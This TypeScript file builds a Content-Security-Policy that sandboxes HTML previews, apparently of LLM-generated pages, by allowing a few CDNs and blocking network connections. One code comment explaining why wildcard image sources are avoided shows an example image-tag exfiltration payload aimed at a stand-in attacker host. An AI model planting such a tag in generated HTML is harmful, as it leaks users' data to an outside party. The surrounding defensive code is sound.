// CSP whitelist applied to HTML files previewed in the Files
// explorer iframe. We ship a narrow list of trusted CDNs that the
// LLM commonly pulls from (Chart.js, D3, Tailwind, etc. via
// jsdelivr / unpkg / cdnjs) plus Google Fonts. Anything else —
// random `https://` origins, phone-home `fetch()` calls, etc. —
// is rejected.
//
// Widen by editing `HTML_PREVIEW_CSP_ALLOWED_CDNS` below. Keep the
// list audited — every entry is a potential supply-chain surface.

export const HTML_PREVIEW_CSP_ALLOWED_CDNS: readonly string[] = [
  "https://cdn.jsdelivr.net",
  "https://unpkg.com",
  "https://cdnjs.cloudflare.com",
  "https://fonts.googleapis.com",
  "https://fonts.gstatic.com",
];

/**
 * Build the CSP string. Split from the wrapper so tests can exercise
 * the policy without HTML-template noise.
 */
export function buildHtmlPreviewCsp(cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  const cdnList = cdns.join(" ");
  return [
    "default-src 'none'",
    // LLM-authored HTML almost always uses inline <script> blocks
    // alongside the CDN load. No feasible path to avoid
    // 'unsafe-inline' without rewriting every output.
    `script-src 'unsafe-inline' ${cdnList}`,
    `style-src 'unsafe-inline' ${cdnList}`,
    `font-src ${cdnList}`,
    // Images: same-origin (workspace files via /api/files/raw), CDN
    // whitelist, plus data: and blob: for inline PNGs and dynamically-
    // generated charts. Wildcard is deliberately avoided — an attacker
    // who plants an <img src="https://evil/?leak="> in preview HTML
    // could exfiltrate data via image requests even with connect-src
    // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
    // legitimately needs more hosts.
    `img-src 'self' ${cdnList} data: blob:`,
    // Block XHR / fetch / WebSocket so previews can't phone home or
    // exfiltrate anything the inline scripts happen to compute.
    "connect-src 'none'",
  ].join("; ");
}

/**
 * Build the CSP string for the print-mode hidden iframe (presentHtml's
 * printToPdf). The print iframe loads via `srcdoc`, so its document
 * has an opaque origin: `'self'` no longer matches the server origin
 * and same-origin `<img src="/artifacts/images/...">` would be blocked.
 *
 * Same shape as `buildHtmlPreviewCsp` but with `img-src` widened from
 * `'self'` to the explicit `${origin}` so workspace images keep
 * loading after the `<base href>` injection rewrites their relative
 * URLs to absolute server URLs.
 */
export function buildPrintCspContent(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  const cdnList = cdns.join(" ");
  return [
    "default-src 'none'",
    `script-src 'unsafe-inline' ${cdnList}`,
    `style-src 'unsafe-inline' ${cdnList}`,
    `font-src ${cdnList}`,
    `img-src ${origin} ${cdnList} data: blob:`,
    "connect-src 'none'",
  ].join("; ");
}

const CSP_META_NONCE = ""; // reserved for future use (per-render nonce)

/**
 * Inject a `<meta http-equiv="Content-Security-Policy">` tag into the
 * HTML head. If the HTML has no `<head>`, wrap it as a full document
 * with a synthetic head so the meta tag is honoured regardless.
 *
 * Pure — doesn't touch the DOM. Safe to use from both client and
 * tests.
 */
export function wrapHtmlWithPreviewCsp(html: string): string {
  const csp = buildHtmlPreviewCsp();
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  if (/<head\b[^>]*>/i.test(html)) {
    return html.replace(/(<head\b[^>]*>)/i, `$1${meta}`);
  }
  // No <head> — treat as fragment and wrap it.
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>${CSP_META_NONCE}`;
}
